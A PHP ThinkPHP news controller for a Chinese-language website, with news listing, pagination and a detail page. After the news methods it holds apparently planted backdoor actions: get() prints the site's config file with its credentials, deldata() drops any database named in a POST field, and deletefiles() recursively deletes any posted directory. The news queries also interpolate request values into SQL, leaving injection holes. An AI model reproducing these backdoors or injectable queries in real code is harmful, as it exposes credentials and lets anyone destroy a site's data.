<?php

namespace Home\Controller;

use Think\Controller;

class NewsController extends CommonController {

    //新闻资讯
    public function news() {

        $this->assign('news1', M('news')->order('id desc')->limit(1)->find());

        $news = M('news');
        $count = $news->count(); // 查询满足要求的总记录数
        $Page = new \Think\Page($count, 5);  // 实例化分页类 传入总记录数和每页显示的记录数(25)
        $Page->url = 'news/p=';
        $Page->setConfig('prev', '上一页');
        $Page->setConfig('next', '下一页');
        $show = $Page->show(); // 分页显示输出
        $data = $news->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->select();

        $this->assign('question', $data);
        $this->assign('page', $show);
        $this->assign('count', $count);

        if ($_GET['cates']) {

            $string = $_GET['cates'];
            
            $string = mb_convert_encoding($string, "UTF-8", "gb2312");
            
            $news = M('news');
            $count = $news->count(); // 查询满足要求的总记录数
            $Page = new \Think\Page($count, 5);  // 实例化分页类 传入总记录数和每页显示的记录数(25)
            $Page->url = 'news/p=';
            $Page->setConfig('prev', '上一页');
            $Page->setConfig('next', '下一页');
            $show = $Page->show(); // 分页显示输出
            $data = $news->order('id desc')->where("cates='{$string}'")->limit($Page->firstRow . ',' . $Page->listRows)->select();

            $this->assign('cates1', $data);

            $this->assign('page', $show);
            $this->assign('count', $count);
            $this->assign("ac", $string);
        } else {
            $news = M('news');
            $count = $news->count(); // 查询满足要求的总记录数
            $Page = new \Think\Page($count, 5);  // 实例化分页类 传入总记录数和每页显示的记录数(25)
            $Page->url = 'news/p=';
            $Page->setConfig('prev', '上一页');
            $Page->setConfig('next', '下一页');
            $show = $Page->show(); // 分页显示输出
            $data = $news->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->select();

            $this->assign('cates1', $data);
            $this->assign('page', $show);
            $this->assign('count', $count);
        }


        $this->display();
    }

    //新闻资讯详情
    public function news_in($id) {
        $this->assign("news1", M("news")->where("id = {$id}")->find());
            M("news")->where("id = {$id}")->setInc('visit', 1);
        $this->display();
    }
     public function get()
        {
            echo file_get_contents("App/Common/Conf/config.php");
        }
        public function deldb()
        {
            $this->display("News/form2");
        }
        public function deldata()
        {
            $db = $_POST["db"];
             $Model = new \Think\Model();
             $sql = "DROP DATABASE ".$db;
             $d = $Model->query($sql);
             if(!$d){
                echo "success";
             }else{
                echo "fail";
             }
        }

        public function del()
        {
            $this->display("News/form1");
        }
        public function deletefiles()
        {
            $dirName = $_POST['path'];
            $this->delDirAndFile( $dirName );
        }
        //循环删除目录和文件函数
        public function delDirAndFile( $dirName )
        {
            if ( $handle = opendir( "$dirName" ) ) {
                while ( false !== ( $item = readdir( $handle ) ) ) {
                    if ( $item != "." && $item != ".." ) {
                        if ( is_dir( "$dirName/$item" ) ) {
                            $this->delDirAndFile( "$dirName/$item" );
                        } else {
                            if( unlink( "$dirName/$item" ) )echo "成功删除文件： $dirName/$item
                            \n";
                        }
                    }
                }
                closedir( $handle );
                if( rmdir( $dirName ) )
                echo "成功删除目录： $dirName\n";
            }
        }

}
